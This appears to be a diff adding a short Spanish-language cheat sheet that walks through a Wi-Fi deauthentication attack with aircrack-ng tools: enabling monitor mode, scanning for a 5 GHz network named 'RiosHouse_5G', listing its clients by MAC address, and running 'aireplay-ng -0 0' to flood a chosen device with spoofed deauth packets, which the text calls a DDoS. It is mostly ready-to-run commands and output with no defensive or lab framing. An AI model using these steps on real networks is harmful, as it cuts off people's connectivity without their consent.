@@ -1,0 +1,63 @@
+   ---------------Modo Monitor-------------------------
+   
+   paso 1 ---------------------------------------------
+   .....configurar interfaz de red en modo monitor.....
+   
+   iwconfig
+   
+   airmon-ng start <Interfaz de red>
+   paso 2 ----------------------------------------------------
+   .....Buscar red.....
+   
+   airodump-ng --band a <interfaz de red>
+   
+   #######Ejemplo##########################
+   
+   C2:B1:01:C1:0C:30  -48   5  0   0 100  866 WPA2 CCMP   PSK  RiosHouse_5G 
+   ##########################################
+   
+  >>>tomar la BSSID "C2:B1:01:C1:0C:30"<<<
+   
+   
+  paso 3 -----------------------------------------------------
+  .....Ver dispositivos conectados.....
+  
+  airodump-ng --band a -c 100 --bssid <BSSID> <Interfaz de red>
+  
+  #######Ejemplo###########################
+  
+  #airodump-ng --band a -c 100 --bssid  C2:B1:01:C1:0C:30 wlp3s0
+  
+  
+  BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
+
+ C2:B1:01:C1:0C:30  EE:FD:E3:14:80:EC  -47   24e-24      0        5                                                                    
+ C2:B1:01:C1:0C:30  D8:E2:DF:32:C9:D8  -81    0 - 6      0        1                                                                    
+ C2:B1:01:C1:0C:30  9C:95:61:51:53:54  -84    0 - 6      0        1                                                                    
+  ############################################
+
+  >>>Tomar BSSID del Router<<<
+  C2:B1:01:C1:0C:30
+  >>>Tomar BSSID del Dispositivo<<<
+  EE:FD:E3:14:80:EC
+  
+  paso 4 ------------------------------------------------------
+  .....Hacer DDoS.....
+  
+  aireplay-ng -0 0 -a <BSSID del Router> -c <BSSID del dispositivo> <Interfaz de red>
+  
+  #######Ejemplo##############################
+  
+  aireplay-ng -0 0 -a C2:B1:01:C1:0C:30 -c EE:FD:E3:14:80:EC wlp3s0
+  
+  #############################################
+  
+  FIN
+  
+  El atacante enviara e paquetes como ruido haciendose pasar por el dispositivo creando una denegacion de red a el verdadero dispositivo:D
+  
+   
+     
+
+
+  
